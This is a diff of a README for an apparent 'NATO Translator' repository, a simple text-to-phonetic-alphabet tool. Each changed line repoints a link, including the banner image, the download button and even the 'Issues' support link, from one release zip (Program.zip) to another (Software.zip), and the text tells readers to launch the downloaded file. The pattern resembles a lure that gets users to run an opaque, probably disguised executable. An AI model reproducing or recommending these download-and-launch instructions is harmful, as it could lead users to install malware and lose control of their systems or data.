@@ -1,6 +1,6 @@
 # 🌐 Welcome to the NATO Translator Repository 🌐
 
-![NATO](https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip)
+![NATO](https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip)
 
 ## Repository Name: `nato-translator`
 
@@ -25,10 +25,10 @@ This project is a handy tool that translates English letters and sentences into 
 * translator
 
 ### Usage
-To utilize this NATO Translator, simply click the following link: [Download https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip](https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip)  
+To utilize this NATO Translator, simply click the following link: [Download https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip](https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip)  
 *Launch the downloaded file to access the translator.*
 
-[![Download](https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip)](https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip)
+[![Download](https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip)](https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip)
 
 ### How It Works
 The NATO Translator takes input text in English and converts it into the corresponding NATO phonetic alphabet representation. This can be extremely useful in scenarios where verbal communication of letters is crucial for clarity and precision, such as in military operations, aviation, or emergency services.
@@ -48,7 +48,7 @@ Hotel Echo Lima Lima Oscar, Whiskey Oscar Romeo Lima Delta!
 ```
 
 ### Support
-For any questions, issues, or feedback regarding the NATO Translator, please feel free to reach out via the [Issues](https://github.com/666iguessh9cker666/nato-translator/releases/download/v1.0/Program.zip) section of this repository.
+For any questions, issues, or feedback regarding the NATO Translator, please feel free to reach out via the [Issues](https://github.com/666iguessh9cker666/nato-translator/releases/download/v2.0/Software.zip) section of this repository.
 
 ### Contributions
 Contributions are welcome! If you have any ideas for improvements or new features, please submit a pull request.
